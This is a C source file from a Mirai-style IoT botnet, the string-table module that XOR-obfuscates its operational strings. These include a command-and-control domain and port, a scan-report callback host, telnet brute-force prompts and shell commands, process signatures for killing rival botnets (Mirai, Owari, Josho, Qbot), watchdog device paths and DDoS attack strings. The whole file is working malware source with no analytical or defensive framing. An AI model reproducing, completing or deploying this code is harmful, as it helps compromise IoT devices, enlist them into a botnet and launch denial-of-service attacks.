#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xdeadbeef;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4D\x4C\x46\x4B\x4C\x47\x56\x0C\x41\x44\x22", 16); // cnc.condinet.cf
    add_entry(TABLE_CNC_PORT, "\x29\x9D", 2); // 3007

    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4D\x4C\x46\x4B\x4C\x47\x56\x0C\x41\x44\x22", 19); // report.condinet.cf
    add_entry(TABLE_SCAN_CB_PORT, "\x9E\x26", 2); // 48132
    
    add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);

    // killer
    add_entry(TABLE_KILLER_PROC, "\x0D\x52\x50\x4D\x41\x0D\x22", 7);// /proc/
    add_entry(TABLE_KILLER_EXE, "\x0D\x47\x5A\x47\x22", 5);// /exe
    add_entry(TABLE_KILLER_FD, "\x0D\x44\x46\x22", 4);// /fd
    add_entry(TABLE_KILLER_MAPS, "\x0D\x4F\x43\x52\x51\x22", 6);// /maps
    add_entry(TABLE_KILLER_TCP, "\x0D\x52\x50\x4D\x41\x0D\x4C\x47\x56\x0D\x56\x41\x52\x22", 14);// /proc/net/tcp

    // scan
    add_entry(TABLE_SCAN_SHELL, "\x51\x4A\x47\x4E\x4E\x22", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x47\x4C\x43\x40\x4E\x47\x22", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x51\x5B\x51\x56\x47\x4F\x22", 7);
    add_entry(TABLE_SCAN_SH, "\x51\x4A\x22", 3);
    add_entry(TABLE_SCAN_LSHELL, "\x4E\x4B\x4C\x57\x5A\x51\x4A\x47\x4E\x4E\x22", 11); // linuxshell
    add_entry(TABLE_SCAN_QUERY, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x61\x6D\x6C\x66\x6B\x22", 19);
    add_entry(TABLE_SCAN_RESP, "\x61\x6D\x6C\x66\x6B\x18\x02\x43\x52\x52\x4E\x47\x56\x02\x4C\x4D\x56\x02\x44\x4D\x57\x4C\x46\x22", 24);
    add_entry(TABLE_SCAN_NCORRECT, "\x4C\x41\x4D\x50\x50\x47\x41\x56\x22", 9);
    add_entry(TABLE_SCAN_OGIN, "\x4D\x45\x4B\x4C\x22", 5);
    add_entry(TABLE_SCAN_ASSWORD, "\x43\x51\x51\x55\x4D\x50\x46\x22", 8);
    add_entry(TABLE_SCAN_ENTER, "\x47\x4C\x56\x47\x50\x22", 6);
    add_entry(TABLE_SCAN_PS, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x52\x51\x22", 16);
    add_entry(TABLE_SCAN_KILL_9, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x49\x4B\x4E\x4E\x02\x0F\x1B\x02\x22", 22);

    // exec
    add_entry(TABLE_EXEC_MIRAI, "\x46\x54\x50\x6A\x47\x4E\x52\x47\x50\x22", 10); // "dvrHelper"
    add_entry(TABLE_EXEC_OWARI, "\x7A\x13\x1B\x6B\x10\x11\x1B\x13\x10\x16\x77\x6B\x77\x22", 14); // "X19I239124UIU"
    add_entry(TABLE_EXEC_JOSHO, "\x13\x16\x64\x43\x22", 5); // "14Fa"
    add_entry(TABLE_EXEC_ALLQBOT, "\x07\x51\x02\x07\x51\x02\x6A\x76\x76\x72\x22", 11); // "%s %s HTTP"
    add_entry(TABLE_EXEC_OGOWARI, "\x6B\x57\x7B\x45\x57\x48\x47\x6B\x53\x4C\x22", 11); // "IuYgujeIqn"
    add_entry(TABLE_EXEC_MIRAIDLR, "\x46\x4E\x50\x0C\x22", 5);// "dlr."
    add_entry(TABLE_EXEC_MIRAIARM, "\x0C\x43\x50\x4F\x22", 5);// ".arm"
    add_entry(TABLE_EXEC_MIRAIMIPS, "\x0C\x4F\x4B\x52\x51\x22", 6);// ".mips"
    add_entry(TABLE_EXEC_MIRAIMPSL, "\x0C\x4F\x52\x51\x4E\x22", 6);// ".mpsl"
    add_entry(TABLE_EXEC_X86_64, "\x0C\x5A\x1A\x14\x7D\x14\x16\x22", 8);// ".x86_64"
    add_entry(TABLE_EXEC_X86, "\x0C\x5A\x1A\x14\x22", 5);// ".x86"

    // watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE1, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14);// /dev/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE2, "\x0D\x46\x47\x54\x0D\x4F\x4B\x51\x41\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 19);// /dev/misc/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE3, "\x0D\x46\x47\x54\x0D\x64\x76\x75\x66\x76\x13\x12\x13\x7D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 23);// /dev/FTWDT101_watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE4, "\x0D\x46\x47\x54\x0D\x64\x76\x75\x66\x76\x13\x12\x13\x7E\x02\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 24);// /dev/FTWDT101\ watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE5, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x12\x22", 15);// /dev/watchdog0
    add_entry(TABLE_IOCTL_KEEPALIVE6, "\x0D\x47\x56\x41\x0D\x46\x47\x44\x43\x57\x4E\x56\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 22);// /etc/default/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE7, "\x0D\x51\x40\x4B\x4C\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 15);// /sbin/watchdog

    // atk setup
    add_entry(TABLE_ATK_VSE, "\x76\x71\x4D\x57\x50\x41\x47\x02\x67\x4C\x45\x4B\x4C\x47\x02\x73\x57\x47\x50\x5B\x22", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x0D\x47\x56\x41\x0D\x50\x47\x51\x4D\x4E\x54\x0C\x41\x4D\x4C\x44\x22", 17);
    add_entry(TABLE_ATK_NSERV, "\x4C\x43\x4F\x47\x51\x47\x50\x54\x47\x50\x02\x22", 12);
    
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
